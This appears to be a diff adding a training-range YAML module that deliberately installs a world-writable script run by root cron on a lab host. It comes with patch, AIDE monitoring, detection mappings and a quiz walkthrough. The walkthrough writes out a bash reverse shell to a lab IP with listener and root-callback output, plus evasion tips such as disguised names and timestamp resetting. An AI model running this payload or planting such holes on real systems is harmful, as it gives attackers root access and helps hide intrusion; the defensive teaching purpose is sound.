@@ -1,0 +1,509 @@
+# Bolt-on: World-Writable Cron Job
+# --------------------------------
+# Install drops /etc/cron.d/bolton-rsync that runs /tmp/bolton-rsync.sh
+# as root every minute, and creates /tmp/bolton-rsync.sh world-writable.
+# Any local user can rewrite the script body and gain a root shell on
+# the next cron tick — classic writable-script-in-root-cron persistence
+# (T1053.003).
+#
+# Patch removes both files and installs an AIDE rule that monitors
+# /etc/cron.d for unauthorised additions and integrity drift.
+#
+# Elastic rule UUID sampled from:
+#   Research/elastic-detection-rules/rules/linux/persistence_cron_job_creation.toml
+
+id: bolton.persistence.cron-writable-job
+slug: cron-writable-job
+name: "World-Writable Cron Job (root execution)"
+version: "1.0.0"
+author: "Red Team Infra"
+last_updated: 2026-05-23
+
+category: persistence
+subcategory: cron
+tags:
+  - cron
+  - persistence
+  - world-writable
+  - privilege-escalation
+  - linux
+description: >
+  Drops /etc/cron.d/bolton-rsync containing
+  `* * * * * root bash /tmp/bolton-rsync.sh` and creates
+  /tmp/bolton-rsync.sh with mode 0666 (world-writable). Cron runs the
+  script as root every minute, so any local user who rewrites the script
+  body gets a root shell on the next tick — a writable-cron-script
+  persistence and privilege-escalation primitive (MITRE T1053.003).
+
+cve: []
+references:
+  - "https://attack.mitre.org/techniques/T1053/003/"
+  - "https://man7.org/linux/man-pages/man5/crontab.5.html"
+  - "https://gtfobins.github.io/"
+
+mitre:
+  tactic:
+    id: TA0003
+    name: "Persistence"
+  technique:
+    id: T1053
+    name: "Scheduled Task/Job"
+  subtechnique:
+    id: T1053.003
+    name: "Cron"
+
+detection:
+  coverage_status: covered
+  elastic_rules:
+    - rule_uuid: "ff10d4d8-fea7-422d-afb1-e5a2702369a9"
+      rule_name: "Cron Job Created or Modified"
+      rule_filename: "linux/persistence_cron_job_creation.toml"
+      coverage: full
+      confidence: high
+      last_validated: 2026-05-23
+      notes: "Fires on FILE_CREATE under /etc/cron.d — directly catches the install step."
+  signal_sources:
+    - "Auditd FILE_CREATE on /etc/cron.d/*"
+    - "Auditd FILE_WRITE on /tmp/bolton-rsync.sh by non-root uid (the abuse path)"
+    - "osquery file_events table — new entries under /etc/cron.d/"
+
+targets:
+  supported_os:
+    - family: linux
+      min_version: "20.04"
+      max_version: "24.04"
+  required_roles:
+    - linux_member
+    - standalone
+  required_services:
+    - cron
+  required_domain_function_level: null
+
+depends_on: []
+conflicts_with: []
+
+side_effects:
+  global: false
+  network_visible: false
+  reboot_required: false
+
+install:
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.copy
+      description: "Create the world-writable cron payload script."
+      role_vars:
+        dest: "/tmp/bolton-rsync.sh"
+        content: |
+          #!/bin/bash
+          # Placeholder payload — bolt-on test artifact.
+          /usr/bin/true
+        owner: root
+        group: root
+        mode: "0666"
+    - ansible_role: ansible.builtin.copy
+      description: "Drop the /etc/cron.d entry that runs the script as root each minute."
+      role_vars:
+        dest: "/etc/cron.d/bolton-rsync"
+        content: |
+          # bolton-cron-writable-job — runs /tmp/bolton-rsync.sh as root every minute
+          SHELL=/bin/sh
+          PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+          * * * * * root bash /tmp/bolton-rsync.sh
+        owner: root
+        group: root
+        mode: "0644"
+  verify:
+    probe: |
+      test -f /etc/cron.d/bolton-rsync && test -w /tmp/bolton-rsync.sh
+    timeout_seconds: 30
+    expect_exit_code: 0
+
+uninstall:
+  description: "Remove the cron entry and the writable payload script."
+  estimated_time_seconds: 15
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove cron entry."
+      role_vars:
+        path: "/etc/cron.d/bolton-rsync"
+        state: absent
+    - ansible_role: ansible.builtin.file
+      description: "Remove writable payload."
+      role_vars:
+        path: "/tmp/bolton-rsync.sh"
+        state: absent
+  verify:
+    probe: |
+      test ! -e /etc/cron.d/bolton-rsync && test ! -e /tmp/bolton-rsync.sh
+    timeout_seconds: 15
+    expect_exit_code: 0
+
+patch:
+  description: >
+    Remove the bad cron entry and writable script, install AIDE, and
+    seed /etc/aide/aide.conf.d/99-bolton-cron with a rule that monitors
+    /etc/cron.d for content + permission + ownership changes. A daily
+    cron job (bolton-aide-cron-check) runs `aide --check` scoped to that
+    rule set and syslog-warns on any diff.
+  patch_reference:
+    - "https://attack.mitre.org/mitigations/M1022/"
+    - "https://aide.github.io/"
+  complexity: medium
+  side_effects:
+    - "AIDE package installed (~10 MB)"
+    - "Initial AIDE DB build takes ~30s and scans /etc/cron.d only"
+    - "Daily cron job at ~06:25 runs the integrity check"
+    - "Syslog entries tagged 'bolton-aide-cron-check' on drift"
+  rollback_supported: true
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove the cron entry."
+      role_vars:
+        path: "/etc/cron.d/bolton-rsync"
+        state: absent
+    - ansible_role: ansible.builtin.file
+      description: "Remove the writable payload."
+      role_vars:
+        path: "/tmp/bolton-rsync.sh"
+        state: absent
+    - ansible_role: ansible.builtin.package
+      description: "Install AIDE."
+      role_vars:
+        name: aide
+        state: present
+    - ansible_role: ansible.builtin.copy
+      description: "Seed AIDE rule scoped to /etc/cron.d."
+      role_vars:
+        dest: "/etc/aide/aide.conf.d/99-bolton-cron"
+        content: |
+          # bolton — monitor /etc/cron.d for content+perm+owner changes
+          /etc/cron.d   p+i+n+u+g+s+m+c+md5
+        owner: root
+        group: root
+        mode: "0644"
+    - ansible_role: ansible.builtin.shell
+      description: "Initialise the AIDE DB."
+      role_vars:
+        cmd: "aideinit -y -f 2>/dev/null || aide --init"
+        creates: "/var/lib/aide/aide.db.new"
+    - ansible_role: ansible.builtin.copy
+      description: "Install daily AIDE-on-cron checker."
+      role_vars:
+        dest: "/etc/cron.daily/bolton-aide-cron-check"
+        content: |
+          #!/bin/sh
+          # bolton-aide-cron-check — warn on /etc/cron.d drift
+          /usr/bin/aide --check 2>&1 | grep -E "^(added|changed|removed)" | while read line; do
+            logger -t bolton-aide-cron-check "DRIFT: $line"
+          done
+        owner: root
+        group: root
+        mode: "0755"
+  verify:
+    probe: |
+      test ! -e /etc/cron.d/bolton-rsync && test ! -e /tmp/bolton-rsync.sh && test -f /etc/aide/aide.conf.d/99-bolton-cron && test -x /etc/cron.daily/bolton-aide-cron-check
+    timeout_seconds: 60
+    expect_exit_code: 0
+  exploit_probe_after_patch: "webapp/bolton/exploit_probes/cron_writable_check.sh"
+
+patch_revert:
+  description: "Remove AIDE monitoring + re-drop cron entry and writable script — writable-cron persistence is back."
+  estimated_time_seconds: 30
+  steps:
+    - ansible_role: ansible.builtin.file
+      description: "Remove AIDE checker."
+      role_vars:
+        path: "/etc/cron.daily/bolton-aide-cron-check"
+        state: absent
+    - ansible_role: ansible.builtin.file
+      description: "Remove AIDE rule."
+      role_vars:
+        path: "/etc/aide/aide.conf.d/99-bolton-cron"
+        state: absent
+    - ansible_role: ansible.builtin.copy
+      description: "Re-create the world-writable cron payload script."
+      role_vars:
+        dest: "/tmp/bolton-rsync.sh"
+        content: |
+          #!/bin/bash
+          /usr/bin/true
+        owner: root
+        group: root
+        mode: "0666"
+    - ansible_role: ansible.builtin.copy
+      description: "Re-drop the /etc/cron.d entry."
+      role_vars:
+        dest: "/etc/cron.d/bolton-rsync"
+        content: |
+          SHELL=/bin/sh
+          PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+          * * * * * root bash /tmp/bolton-rsync.sh
+        owner: root
+        group: root
+        mode: "0644"
+  verify:
+    probe: |
+      test -f /etc/cron.d/bolton-rsync && test -w /tmp/bolton-rsync.sh
+    timeout_seconds: 30
+    expect_exit_code: 0
+  warning: "Any local user can rewrite /tmp/bolton-rsync.sh and get a root shell on the next cron tick."
+
+cost:
+  storage_mb: 10
+  cpu_pct: 1
+  detectability: loud
+
+curriculum:
+  title: "World-Writable Cron Job — Root via Script Rewrite"
+  summary: >
+    Walkthrough of T1053.003 (Cron) persistence + escalation against
+    tllinux01 (10.99.50.13). You enumerate cron entries, find a
+    root-owned cron whose target script is world-writable, rewrite
+    the script with a reverse-shell payload, and catch a root
+    callback on the next minute tick. Final step removes the
+    artefacts and deploys AIDE integrity monitoring on /etc/cron.d.
+  learning_objectives:
+    - "Map ALL cron sources: /etc/crontab, /etc/cron.d/*, /etc/cron.{hourly,daily,weekly,monthly}/, /var/spool/cron/crontabs/*."
+    - "Identify a writable script invoked by a root-owned cron entry."
+    - "Rewrite the script with a payload that survives multiple cron ticks."
+    - "Map to Elastic's Cron Job Created or Modified rule."
+    - "Remove the artefacts + deploy AIDE file-integrity monitoring scoped to /etc/cron.d."
+  prerequisites:
+    - "SSH access to tllinux01 (10.99.50.13) as appuser via the bastion"
+    - "An attacker listener running on Kali (192.168.1.100) — nc -lvnp 4444"
+  estimated_total_minutes: 28
+  steps:
+    - id: "01-cron-enum"
+      title: "Enumerate every cron source"
+      estimated_minutes: 6
+      markdown: |
+        ## Step 1 — Map ALL cron entry points
+
+        Cron entries live in five places on Ubuntu:
+
+        ```bash
+        # On tllinux01 as appuser
+
+        # 1. System crontab
+        cat /etc/crontab
+
+        # 2. Per-package crontabs in /etc/cron.d/ (most modern installs)
+        ls -la /etc/cron.d/
+        cat /etc/cron.d/*
+
+        # 3. Periodic dirs run by run-parts
+        ls -la /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
+
+        # 4. Per-user crontabs (need root to read others'; can read own)
+        crontab -l                    # appuser's own
+        ls -la /var/spool/cron/crontabs/   # 0700 root:crontab — not readable to appuser
+
+        # 5. Systemd timers (modern replacement for cron, frequently overlooked)
+        systemctl list-timers --all
+        ```
+
+        Spot the bolt-on:
+
+        ```bash
+        cat /etc/cron.d/bolton-rsync
+        # SHELL=/bin/sh
+        # PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+        # * * * * * root bash /tmp/bolton-rsync.sh
+        ```
+
+        Cron entry runs as root every minute (`* * * * *`) — and
+        invokes `/tmp/bolton-rsync.sh`. Check the script perms:
+
+        ```bash
+        ls -la /tmp/bolton-rsync.sh
+        # -rw-rw-rw- 1 root root 60 ... /tmp/bolton-rsync.sh   ← world-writable
+        ```
+
+        Jackpot. linpeas auto-detects writable cron scripts:
+
+        ```bash
+        /tmp/linpeas.sh -a 2>/dev/null | grep -A5 "Cron"
+        ```
+
+        **Detection callout:** the install step (`FILE_CREATE` on
+        /etc/cron.d/bolton-rsync) is caught by **Cron Job Created or
+        Modified** (`ff10d4d8-fea7-422d-afb1-e5a2702369a9`) — HIGH
+        confidence, fires immediately on cron entry creation.
+      assessment:
+        question: "Why is a writable SCRIPT (not the cron entry itself) often the easier abuse path?"
+        options:
+          - "Because cron entries are encrypted on disk"
+          - "Because /etc/cron.d/* is usually 0644 root:root (unwritable by low-priv users), but the SCRIPTS those entries invoke are often dropped in shared dirs with lazy permissions"
+          - "Because cron refuses to execute writable cron entries"
+          - "Because scripts get logged differently from cron entries"
+        correct_index: 1
+        explanation: >
+          The /etc/cron.d/ directory is owned root:root mode 0755
+          with files 0644 — no low-priv writes. But the SCRIPTS those
+          cron entries invoke are written by sysadmins in a hurry to
+          places like /tmp, /opt/scripts, /usr/local/bin without
+          tight permissions. The lazy-perms script is the attack
+          surface; the cron entry is just the trigger. This is why
+          enumeration must check BOTH the cron entry contents AND
+          the perms of every script those entries invoke.
+    - id: "02-payload-rewrite"
+      title: "Rewrite the script with a reverse shell"
+      estimated_minutes: 5
+      markdown: |
+        ## Step 2 — Plant the payload
+
+        Pick your favourite reverse-shell one-liner. For a quiet
+        bash callback to Kali:
+
+        ```bash
+        # On Kali (192.168.1.100) — listener first
+        nc -lvnp 4444
+        ```
+
+        ```bash
+        # On tllinux01 as appuser — rewrite the world-writable script
+        cat > /tmp/bolton-rsync.sh << 'EOF'
+        #!/bin/bash
+        # Cron persistence payload — reverse shell to Kali every minute
+        bash -i >& /dev/tcp/192.168.1.100/4444 0>&1 &
+        EOF
+        ```
+
+        Within 60 seconds, cron fires the script as root:
+
+        ```
+        # On Kali listener
+        connect to [192.168.1.100] from (UNKNOWN) [10.99.50.13] 47832
+        bash: cannot set terminal process group (-1): Inappropriate ioctl for device
+        root@tllinux01:/# id
+        uid=0(root) gid=0(root) groups=0(root)
+        ```
+
+        The `&` at the end of the bash line is important — it
+        backgrounds the reverse shell so cron's own bash exits
+        cleanly. Without it, cron sees the process hang and may
+        block the next tick.
+
+        > **Alternative payloads:** SUID-bash drop (silent, no
+        > callback needed), Sliver implant binary (modern C2),
+        > authorized_keys append for direct SSH access. Reverse shell
+        > is loudest but easiest to demo.
+
+        **Detection callout:** FILE_WRITE on /tmp/bolton-rsync.sh by
+        non-root uid is the highest fidelity install signal — add
+        auditd rule `-w /tmp/bolton-rsync.sh -p w -k cron_script_w`.
+        At the network layer, the outbound TCP 4444 to a non-RFC1918
+        IP is also flagged by Suricata/Zeek if enabled.
+    - id: "03-persistence-properties"
+      title: "Persistence properties of cron"
+      estimated_minutes: 4
+      markdown: |
+        ## Step 3 — Why cron is the persistence sweet spot
+
+        Cron-based persistence is operationally attractive because:
+
+        - **Survives reboot** — cron is a system service, restarts automatically.
+        - **No SSH key required** — works even if sshd is locked down.
+        - **High frequency tolerated** — minute-granularity is normal cron use, so callbacks blend in.
+        - **Easy to disguise** — name the script `sys-update`, `apt-cleanup`, `rsync-snapshot`; nobody questions it.
+        - **Multiple paths** — even if defenders nuke /etc/cron.d/foo, the writable script may also be referenced from /var/spool/cron/crontabs/root.
+
+        Operator hygiene checklist:
+
+        - Backup the original script content BEFORE overwriting so
+          you can restore it once your callback lands (lower noise).
+        - Avoid `* * * * *` (every minute) in real engagements — pick
+          `*/15` or `@hourly` to reduce log volume.
+        - Touch the file's atime/mtime back to the original after
+          editing: `touch -d "$(stat -c %y backup)" /tmp/bolton-rsync.sh`.
+
+        **Detection callout:** osquery's `file_events` table on
+        /etc/cron.d/ + /tmp + /opt provides the cleanest baseline.
+        Auditd `-w /etc/cron.d -p wa -k cron_dir_w` captures every
+        write into the cron dir; correlating that with subsequent
+        execve of the named script catches both halves of the abuse.
+      assessment:
+        question: "Which cron persistence indicator is the strongest signal that an attacker (not an admin) made the change?"
+        options:
+          - "A cron entry that runs every minute"
+          - "A cron entry that lives in /etc/cron.d/ rather than /etc/crontab"
+          - "FILE_WRITE on /etc/cron.d/* OR a writable cron-script being modified BY a non-root uid"
+          - "Any cron entry containing the word 'backup'"
+        correct_index: 2
+        explanation: >
+          Modification of cron infrastructure by a non-root uid is
+          the smoking gun — admins make these changes as root via
+          configuration management (Ansible, Puppet) which always
+          runs as root. Frequency, location, and naming are all
+          benign by themselves. Auditd's uid field on the FILE_WRITE
+          event is the discriminator.
+    - id: "04-patch-mitigate"
+      title: "Blue-team: clean + AIDE integrity baseline"
+      estimated_minutes: 13
+      markdown: |
+        ## Step 4 — Apply the patch + verify
+
+        Click the **Patch** action on this card. It:
+
+        1. Removes `/etc/cron.d/bolton-rsync` and `/tmp/bolton-rsync.sh`.
+        2. Installs **AIDE** (Advanced Intrusion Detection Environment).
+        3. Seeds `/etc/aide/aide.conf.d/99-bolton-cron` that monitors
+           /etc/cron.d for content, permission, ownership, and md5
+           changes.
+        4. Initialises the AIDE DB.
+        5. Drops `/etc/cron.daily/bolton-aide-cron-check` that runs
+           `aide --check` and syslog-warns on any drift.
+
+        Re-test:
+
+        ```bash
+        # On tllinux01 as appuser
+        ls /etc/cron.d/bolton-rsync /tmp/bolton-rsync.sh
+        # ls: cannot access ... : No such file or directory
+        ```
+
+        Trigger a benign drift to confirm AIDE is watching:
+
+        ```bash
+        # As root (or via a separate sudo session)
+        echo "# test comment" >> /etc/cron.d/0hourly
+        sudo /etc/cron.daily/bolton-aide-cron-check
+        # → syslog: "bolton-aide-cron-check[...]: DRIFT: changed: /etc/cron.d/0hourly"
+        ```
+
+        Defence-in-depth recommendations:
+
+        - **Run all cron scripts from immutable locations** —
+          /usr/local/sbin or /opt with mode 0755 root:root. Never
+          /tmp or world-writable dirs.
+        - **Enforce script ownership** with auditd
+          `-w /etc/cron.d -p wa -k cron_change` and SIEM alerts on
+          any write by uid != 0.
+        - **systemd timers** are a better-audited alternative to
+          cron — they ship with explicit unit files, user= and
+          group= directives, and journald integration.
+        - **Disable cron entirely** on machines that don't need
+          scheduled jobs (`systemctl mask cron`).
+
+        > **Rollback:** `patch_revert` removes AIDE monitoring and
+        > re-creates the cron entry + writable payload.
+      assessment:
+        question: "Why is AIDE preferred over a simple `find / -newer` cron check for detecting cron-job tampering?"
+        options:
+          - "AIDE runs faster than find"
+          - "AIDE captures content hashes + ownership + mode + xattrs in a baseline DB, so it detects edits that preserve mtime (e.g. touch -d) and ownership changes find -newer misses entirely"
+          - "AIDE is the only tool that can monitor /etc/cron.d"
+          - "AIDE encrypts its baseline so attackers can't tamper with it"
+        correct_index: 1
+        explanation: >
+          AIDE stores a full integrity record (md5/sha256 hashes,
+          mode, owner/group, size, xattrs, mtime/ctime). A
+          sophisticated attacker who touches mtime back to the
+          original (`touch -d "$orig_mtime" file`) defeats `find
+          -newer` entirely but still trips AIDE because the content
+          hash changes. AIDE is also resistant to ctime-only edits.
+          The tradeoff is storage + initial DB build time, but for
+          /etc/cron.d (small, low-churn) it's negligible.
+
+status: stable
